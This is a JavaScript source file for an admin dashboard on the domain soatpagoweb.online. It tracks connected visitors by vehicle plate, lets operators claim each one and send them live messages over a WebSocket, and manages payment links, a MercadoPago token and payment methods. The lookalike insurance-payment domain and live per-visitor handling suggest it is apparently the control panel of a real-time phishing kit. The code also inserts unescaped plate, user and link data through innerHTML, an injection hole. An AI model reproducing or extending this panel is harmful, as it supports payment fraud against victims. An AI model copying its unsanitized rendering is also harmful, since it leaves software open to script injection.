const socket = new WebSocket('wss://www.soatpagoweb.online');
// const socket = new WebSocket('ws://localhost:3000');
const URL_SERVER = 'https://soatpagoweb.online';
// const URL_SERVER = 'http://localhost:3000';

const activeUsers = new Set();

document.addEventListener('DOMContentLoaded', async () => {
    // Verificar si la URL actual termina con 'dashboard.html'

    if (window.location.href.endsWith('dashboard.html')) {
        // Redirigir a la URL correcta
        window.location.href = URL_SERVER + '/dashboard';
        return;
    }

    await loadTokenMercadoPago();
    await loadEmail();
    await loadMethodsPayment();
    await getLinks();
    await getSetting();

    document.getElementById('tokenForm').addEventListener('submit', async (event) => {
        event.preventDefault();
        await updateTokenMercadoPago();
        await loadTokenMercadoPago();
    });

    document.getElementById('emailForm').addEventListener('submit', async (event) => {
        event.preventDefault();
        await updateEmail();
        await loadEmail();
    });

    document.getElementById('methodsPayForm').addEventListener('submit', async (event) => {
        event.preventDefault();
        await updateMethodsPayment();
        await loadMethodsPayment();
    });

    document.getElementById('linksForm').addEventListener('submit', async (event) => {
        event.preventDefault();
        await createLink();
        await getLinks();
    })

    document.getElementById('userPaymentMethod').addEventListener('submit', async (event) => {
        event.preventDefault();
        await updateSetting();
        await getSetting();
    })
});

socket.onmessage = (event) => {
    const data = JSON.parse(event.data);

    if (data.heartbeat) {
        // Ignore "heartbeats"
        return;
    }

    if (data.updateState && data.handling && data.nickname) {
        // Si hay una actualización de estado, deshabilita el botón para la placa específica
        updatePlateState(data.userId, false, true, data.nickname);
    } else if (data.updateState && !data.handling) {
        updatePlateState(data.userId, false, false);
    } else if (data.activeUsers) {
        // Actualizar la lista de usuarios activos
        activeUsers.clear();

        data.activeUsers.forEach(userId => {
            activeUsers.add(userId);
        });

        updateConnectionStatus();
    } else {
        addNewPlate(data);
    }
};

const addNewPlate = (placa) => {
    const tbody = document.querySelector('#platesTable tbody');
    const row = document.createElement('tr');

    row.setAttribute('data-state', placa.userId);

    // Verificar si el usuario está conectado
    const isConnected = activeUsers.has(placa.userId);

    row.innerHTML = `
        <td ondblclick="loadingMessage('${placa.userId}')">${placa.userId}</td>
        <td class="alignCenter">
            <p id="statusCircle_${placa.userId}" class="status-circle ${isConnected ? 'online' : 'offline'}"></p>
        </td>
        <td>${placa.placa}</td>
        <td>
            <button class="btn btn-success" onclick="sendMessage('${placa.userId}')">Enviar Mensaje</button>
            <span id="handlingIcon_${placa.userId}" class="handling-icon disabled">
                <i class="fas fa-spinner fa-spin"></i>
            </span>
            <span id="nickname_${placa.userId}" class="margin-left"></span>
        </td>
    `;

    tbody.appendChild(row);
}

const loadingMessage = (userId) => {
    // Send message to server with userId y the data handling
    socket.send(JSON.stringify({ userId, updateState: false, handling: true }));
}

const sendMessage = (userId) => {
    const nickname = localStorage.getItem('nickname');

    // Send message to server with userId y the data handling
    socket.send(JSON.stringify({ userId, handling: true, nicknameAdmin: nickname }));

    sendMessageForPlate(userId);
}

const sendMessageForPlate = (userId) => {
    const message = prompt('Ingrese su mensaje:');

    if (message) {
        // Send message to server with userId
        socket.send(JSON.stringify({ userId, message, handling: false }));
    }
}

const updatePlateState = (userId, newState, handling, nickname = '') => {
    const plateRow = document.querySelector(`#platesTable tbody tr[data-state="${userId}"]`);

    if (plateRow.querySelector('button').disabled === true) {
        return;
    }

    if (nickname !== '') {
        document.getElementById(`nickname_${userId}`).textContent = nickname;
    }

    if (handling === false) {
        // Add class disabled
        document.getElementById(`handlingIcon_${userId}`).classList.add('disabled');
    }

    if (handling) {
        // Remove class disabled
        document.getElementById(`handlingIcon_${userId}`).classList.remove('disabled');
        return;
    }

    // Cambia el color de fondo y deshabilita el botón si el estado es false
    if (newState === false) {
        plateRow.querySelector('button').disabled = true;
    }

    // Actualiza el atributo data-state
    plateRow.setAttribute('data-state', userId);
}

document.querySelector('#btnLogout').addEventListener('click', async () => {
    try {
        const response = await fetch(`${URL_SERVER}/logout`);

        if (response.status === 201) {
            window.location.href = `login.html`;
        }
    } catch (error) {
        console.error('Error logout dashboard ', error);
    }
})

function updateConnectionStatus() {
    const plateRows = document.querySelectorAll('#platesTable tbody tr');

    plateRows.forEach(row => {
        const userId = row.getAttribute('data-state');
        const isConnected = activeUsers.has(userId);

        const statusCircle = document.getElementById(`statusCircle_${userId}`);

        statusCircle.className = `status-circle ${isConnected ? 'online' : 'offline'}`;
    });
}

const loadTokenMercadoPago = async () => {
    try {
        const response = await fetch(`${URL_SERVER}/get-token`);
        const { data } = await response.json();

        const valueTokenInput = document.getElementById('valueToken');

        valueTokenInput.value = data.value;
    } catch (error) {
        console.error('Error cargando el token de mercado pago ', error);
    }
}

const updateTokenMercadoPago = async () => {
    try {
        const valueToken = document.getElementById('valueToken').value;

        await fetch(`${URL_SERVER}/update-token`, {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ valueToken })
        })
    } catch (error) {
        console.error('Error updated token', error);
    }
}

const loadEmail = async () => {
    try {
        const response = await fetch(`${URL_SERVER}/get-email`);
        const { data } = await response.json();

        const valueEmailInput = document.getElementById('valueEmail');

        valueEmailInput.value = data.value;
    } catch (error) {
        console.error('Error cargando el email', error);
    }
}

const updateEmail = async () => {
    try {
        const valueEmail = document.getElementById('valueEmail').value;

        await fetch(`${URL_SERVER}/update-email`, {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ valueEmail })
        })
    } catch (error) {
        console.error('Error updated email', error);
    }
}

const loadMethodsPayment = async () => {
    try {
        const response = await fetch(`${URL_SERVER}/get-methods-payment`);
        const { data } = await response.json();

        const checkedTicker = document.getElementById('ticket');
        const checkedAtm = document.getElementById('atm');
        const checkedCreditCard = document.getElementById('credit_card');
        const checkedDebitCard = document.getElementById('debit_card');
        const checkedPrepaidCard = document.getElementById('prepaid_card');
        const checkedBankTransfer = document.getElementById('bank_transfer');

        checkedTicker.checked = data?.ticket === 1 ? true : false;
        checkedAtm.checked = data?.atm === 1 ? true : false;
        checkedCreditCard.checked = data?.credit_card === 1 ? true : false;
        checkedDebitCard.checked = data?.debit_card === 1 ? true : false;
        checkedPrepaidCard.checked = data?.prepaid_card === 1 ? true : false;
        checkedBankTransfer.checked = data?.bank_transfer === 1 ? true : false;
    } catch (error) {
        console.error('Error cargando los métodos de pago', error);
    }
}

const updateMethodsPayment = async () => {
    try {
        const checkedTicker = document.getElementById('ticket').checked;
        const checkedAtm = document.getElementById('atm').checked;
        const checkedCreditCard = document.getElementById('credit_card').checked;
        const checkedDebitCard = document.getElementById('debit_card').checked;
        const checkedPrepaidCard = document.getElementById('prepaid_card').checked;
        const checkedBankTransfer = document.getElementById('bank_transfer').checked;

        await fetch(`${URL_SERVER}/update-methods-payment`, {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ ticket: checkedTicker, atm: checkedAtm, credit_card: checkedCreditCard, debit_card: checkedDebitCard, prepaid_card: checkedPrepaidCard, bank_transfer: checkedBankTransfer })
        })
    } catch (error) {
        console.error('Error updated methods payments', error);
    }
}

const createLink = async () => {
    try {
        const valueLink = document.getElementById('valueLink').value;
        const link = document.getElementById('link').value;

        await fetch(`${URL_SERVER}/links`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ link, valueLink })
        })

        document.getElementById('valueLink').value = '';
        document.getElementById('link').value = '';
    } catch (error) {
        console.error('Error created link', error);
    }
}

const deleteLink = async (linkId) => {
    try {
        await fetch(`${URL_SERVER}/links/${linkId}`, {
            method: 'DELETE'
        })

        await getLinks();
    } catch (error) {
        console.error('Error created link', error);
    }
}

const editLink = async (linkId) => {
    try {
        window.location.href = URL_SERVER + `/edit.html?id=${linkId}`;
    } catch (error) {
        console.error('Error al editar el enlace', error);
    }
}

const getLinks = async () => {
    try {
        const response = await fetch(`${URL_SERVER}/links`);
        const { data } = await response.json();

        const tbody = document.querySelector('#linksTable tbody');

        tbody.innerHTML = '';

        data?.forEach((link) => {
            const row = document.createElement('tr');

            row.innerHTML = `
                <td>${link?.id}</td>
                <td>$ ${link?.valueLink}</td>
                <td>${link?.link}</td>
                <td>
                    <button class="btn btn-warning" onclick="editLink('${link.id}')">Editar</button>
                    <button class="btn btn-danger" onclick="deleteLink('${link.id}')">Eliminar</button>
                </td>
            `;

            tbody.appendChild(row);
        });
    } catch (error) {
        console.error('Error cargando los links ', error);
    }
}

const getSetting = async () => {
    try {
        const response = await fetch(`${URL_SERVER}/links-mercado`);
        const { data } = await response.json();

        const withMercadoPagoCheck = document.getElementById('withMercadoPago');

        withMercadoPagoCheck.checked = data?.isMercadoPago === 1 ? true : false;
    } catch (error) {
        console.error('Error get settings ', error);
    }
}

const updateSetting = async () => {
    try {
        const checkedIsMercadoPago = document.getElementById('withMercadoPago').checked;

        await fetch(`${URL_SERVER}/update-links-mercado`, {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ isMercadoPago: checkedIsMercadoPago })
        })
    } catch (error) {
        console.error('Error updated setting', error);
    }
}

// Evento que se dispara cuando la conexión WebSocket está abierta
socket.onopen = () => {
    const nickname = localStorage.getItem('nickname');
    socket.send(JSON.stringify({ nickname }));
};